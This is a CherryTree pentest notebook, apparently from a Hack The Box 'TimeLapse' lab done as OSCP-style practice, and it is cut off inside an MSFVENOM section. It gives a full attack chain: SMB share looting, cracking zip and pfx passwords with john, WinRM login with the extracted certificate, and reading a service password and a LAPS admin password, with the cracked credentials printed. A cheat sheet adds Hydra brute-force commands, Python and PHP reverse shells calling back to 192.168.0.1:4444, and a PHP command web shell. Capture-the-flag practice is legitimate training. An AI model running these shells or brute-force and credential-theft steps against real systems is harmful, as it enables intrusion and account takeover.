<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="10.10.11.152" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :10.10.11.152
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1707659178">
      <node name="nmap" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707253702" ts_lastsave="1707253705">
        <rich_text justification="left"></rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                         
 Writeups  nmap -sT -Pn -p0-65535 --min-rate=1000 -T4 -sC -sV -A 10.10.11.152 -o HTB/TimeLapse/nmap/nmapAllTCPn_manual.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 16:03 EST
Nmap scan report for 10.10.11.152 (10.10.11.152)
Host is up (0.16s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-07 05:05:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-02-07T05:07:08+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49732/tcp open  msrpc         Microsoft Windows RPC
55435/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-07T05:06:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.51 seconds
</codebox>
      </node>
      <node name="smb" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707255267" ts_lastsave="1707659188">
        <rich_text>we see the following domain so we add </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> to the ip





</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



once we download everything on the shares folder we see the following :


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


so we convert the zip file in a format we can bruteforce it via john the ripper:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>




</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



now we get the pfx file
we can bruteforce it using john

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and then


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

use the password obtained earlier, in this case </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and add PEM Pass phrase of your choice

now lets extract public certificate too using

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and we can get the powershell via

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and we get the flag

</rich_text>
        <codebox char_offset="38" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">timelapse.htb</codebox>
        <codebox char_offset="55" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> smbclient -N -L 10.10.11.152


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</codebox>
        <codebox char_offset="134" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS_TechnicalSpecification.docx  winrm_backup.zip</codebox>
        <codebox char_offset="220" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">zip2john winrm_backup.zip &gt; winrmbackupzip2john.log</codebox>
        <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=/usr/share/wordlists/rockyou.txt winrmbackupzip2john.log
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2024-02-10 01:45) 1.612g/s 5598Kp/s 5598Kc/s 5598KC/s susu00xoxlove..superrbd
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</codebox>
        <codebox char_offset="288" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> pfx2john legacyy_dev_auth.pfx &gt; pfx2johnoutput.txt        </codebox>
        <codebox char_offset="302" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=/usr/share/wordlists/rockyou.txt pfx2johnoutput.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:34 DONE (2024-02-11 07:58) 0.02858g/s 92395p/s 92395c/s 92395C/s thuglife06..throughthemaze
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</codebox>
        <codebox char_offset="305" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key</codebox>
        <codebox char_offset="356" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">thuglegacy</codebox>
        <codebox char_offset="446" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt </codebox>
        <codebox char_offset="484" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -c ./cert.crt -k ./prv.key -p -u -S</codebox>
      </node>
      <node name="privEscalation" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707659178" ts_lastsave="1707664744">
        <rich_text>First lets download winpeas to target machine

start the python server hosting winpeas.exe





then download it on the target via:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and then running it

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

 we find a ton of output
 
 
 one of them is to look at this </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>which has all the commands ran via this use
 
 so we will open this
 
 
 </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
 
 
 we find two things here:
user: </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
and password </rich_text>
        <rich_text foreground="#5ebdab">E3R$Q62^12p7PLlC%KWaxuaV</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


so we will use winrm to connect via the following command

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and we now can login via svc_deploy


since we know LAPS is installed  we can check the passwords via

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


we get the following password </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

now we can use evilwinrm with the password to get the root flag


</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload ../../../hacking_binaries_tools/privEsc/Windows/winPEAS.bat</codebox>
        <codebox char_offset="157" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
        <codebox char_offset="221" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt </codebox>
        <codebox char_offset="295" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
</codebox>
        <codebox char_offset="333" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">svc_deploy</codebox>
        <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
        <codebox char_offset="435" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S</codebox>
        <codebox char_offset="541" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get-adcomputer -filter * -properties ms-mcs-admpwd | select name,ms-mcs-admpwd

name  ms-mcs-admpwd
----  -------------
DC01  uEI71LeXHV30r2sj9Jn,33$!
DB01
WEB01
DEV01
</codebox>
        <codebox char_offset="575" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uEI71LeXHV30r2sj9Jn,33$!</codebox>
        <codebox char_offset="644" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u administrator -p 'uEI71LeXHV30r2sj9Jn,33$!' -S</codebox>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1707659816">
        <rich_text>
Linux Proof: </rich_text>
        <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
        <rich_text>
Windows Proof: </rich_text>
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">User.txt</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>





</rich_text>
        <rich_text scale="h2">Root.txt</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>








</rich_text>
        <codebox char_offset="182" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname ; whoami.exe /groups ; type user.txt ; ipconfig /all</codebox>
        <encoded_png char_offset="185" justification="left" link=""></encoded_png>
        <codebox char_offset="202" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname ; whoami.exe /groups ; type root.txt ; ipconfig </codebox>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1706989762">
      <rich_text>
☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 103">DNS</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 42">PrivEsc</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 106">SNMP</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.11.152 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 10.10.11.152 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.152 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.10.11.152:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

_______________________________</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>________


SSH



or if th</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>at doesnt work

</rich_text>
          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.152</codebox>
          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.11.152 -u patrick -p /usr/share/wordlists/rockyou.txt
</codebox>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1701626719">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
